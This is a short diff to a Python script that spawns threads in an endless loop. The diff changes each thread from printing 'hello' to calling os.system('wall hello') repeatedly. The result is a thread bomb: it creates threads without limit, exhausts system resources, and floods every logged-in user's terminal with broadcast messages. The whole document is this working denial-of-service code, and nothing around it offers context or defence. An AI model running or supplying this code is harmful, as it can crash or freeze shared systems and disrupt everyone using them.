@@ -1,8 +1,9 @@
 import threading
+import os
 
 def spam():
  while True:
-  print("hello")
+  os.system("wall hello")
 
 while True:
  t = threading.Thread(target=spam)
